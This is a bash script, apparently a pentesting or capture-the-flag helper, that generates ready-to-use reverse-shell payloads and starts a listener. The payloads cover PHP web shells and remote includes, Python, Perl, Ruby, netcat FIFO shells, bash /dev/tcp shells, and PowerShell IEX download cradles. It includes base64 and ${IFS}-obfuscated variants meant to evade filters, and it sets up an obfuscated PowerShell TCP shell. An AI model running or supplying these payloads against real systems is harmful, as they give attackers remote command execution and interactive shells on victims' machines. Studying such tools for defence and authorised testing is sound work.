#!/bin/bash

usage() { 
    echo -e "[-----ScriptBy:h4rithd.com-----]" 
    echo -e "Usage: $0 [ph,py..] [port] [ip] \n" 
} 

port=4545
ip="$(ip addr show | grep 'global tun0' | grep -o '[0-9]*\.[0-9]*\.[0-9]*\.[0-9]*')"

[[ ! -z "$2" ]] && port=$2
[[ ! -z "$3" ]] && ip=$3

function listener {
    if [[ -z "$1" ]]
    then
	echo " -----------------------------------------------------";
	echo " [!] script -qc /bin/bash /dev/null";
	echo " [!] python -c \"import pty;pty.spawn('/bin/bash')\"";
        echo " [!] python3 -c \"import pty;pty.spawn('/bin/bash')\"";
        echo " -----------------------------------------------------";
        nc -lvnp $port
    else
        echo " ----------------------------------------------------------------------";
        echo "powershell \"IEX(New-Object Net.WebClient).downloadString('http://$ip/rev.ps1')\"";
        echo "IEX(New-Object Net.WebClient).DownloadString('http://$ip/rev.ps1')" | iconv --to-code UTF-16LE | base64 -w 0 | xargs echo "powershell -EncodedCommand";
        echo " ----------------------------------------------------------------------";
        echo "[+] rlwrap nc -lvnp $port";
        python3 -m http.server 80;
    fi
}

case "$1" in 
    "--help" | "-h" | "--h" | "-help")
        usage
        exit 0;;
    "ph") #Php
        echo -e "<?php system(\$_REQUEST['cmd']); ?>";
        echo -e "<?php include(\"http://$ip/shell.php\"); ?>";
        echo -e "<?php echo '<pre>'.shell_exec(\$_REQUEST['cmd']).'</pre>'; ?>"; 
        echo -e "<?php exec(\"wget -O /var/www/html/shell.php http://$ip/shell.php\"); ?>"; 
	echo -e "php -r '\$sock=fsockopen(\"$ip\",$port);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"; 
        listener;;
    "py") #Python
	echo -e "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'";
        listener;;
    "pl") #Perl
        echo -e "perl -MIO -e '\$p=fork;exit,if(\$p);\$c=new IO::Socket::INET(PeerAddr,\"$ip:$port\");STDIN->fdopen(\$c,r);$~->fdopen(\$c,w);system\$_ while<>;'";
        listener;;
    "ru") #Ruby
	echo -e "ruby -rsocket -e'f=TCPSocket.open(\"$ip\",$port).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'";
        listener;; 
    "pe") #Perl
	echo -e "perl -e 'use Socket;\$i=\"$ip\";\$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'";
        listener;; 
    "nc") #NetCat
	echo -e "nc -c bash $ip $port";
	echo -e "nc -e /bin/bash $ip $port";
	echo -e "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $ip $port >/tmp/f";
        listener;;
    "wi") #Windows
        #cp /opt/nishang/Shells/Invoke-PowerShellTcp.ps1 rev.ps1;
        #echo -e "Invoke-PowerShellTcp -Reverse -IPAddress $ip -Port $port" >> rev.ps1;
        cp /opt/PrviEsc/WinPrviEsc/RevShell/Invoke-PowerShellTcp-obfuscate.ps1 rev.ps1;
        sed -i "s/ChangeThisIP/$ip/;s/ChangeThisPort/$port/g" rev.ps1;
        listener win;;
    *)   #Bash
	echo -e "bash -i >& /dev/tcp/$ip/$port 0>&1";
	echo -e "bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'";
        echo -e "bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'" | base64 -w 0 | xargs -I {} echo "echo {} | base64 -d | sh";
	echo -e "bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'" | base64 -w 0 | xargs -I {} echo "echo\${IFS}{}\${IFS}|\${IFS}base64\${IFS}-d\${IFS}|\${IFS}sh";
        listener;;
esac 
